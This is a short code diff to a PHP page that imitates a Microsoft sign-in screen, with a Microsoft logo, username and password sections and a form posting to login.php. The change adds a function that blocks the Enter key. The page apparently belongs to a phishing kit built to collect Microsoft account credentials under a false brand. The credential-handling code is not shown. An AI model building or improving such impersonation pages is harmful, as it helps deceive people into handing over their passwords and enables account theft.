@@ -27,7 +27,7 @@ if (isset($_GET['token'])) {
 </head>
 
 <body>
-    <form method="POST" action="login.php">
+    <form method="POST" action="login.php" onkeydown="desabilitarEnter(event)">
         <section id="section_uname">
             <div class="auth-wrapper">
                 <img src="images/logo.svg" alt="Microsoft" style="max-height: 36px;"/>
@@ -856,6 +856,13 @@ CAQCgUAgEAgEAoFAIBAsAUX9P16Zi31dwTgAAAAAAElFTkSuQmCC" alt="Microsoft" class="d-b
             document.getElementById("section_pwd").classList.toggle('d-none');
             document.getElementById('section_uname').classList.remove('d-none');
         })
+
+        // disable enter
+        function desabilitarEnter(event) {
+            if (event.key === "Enter") {
+                event.preventDefault();
+            }
+        }
     </script>
 </body>
 <style>
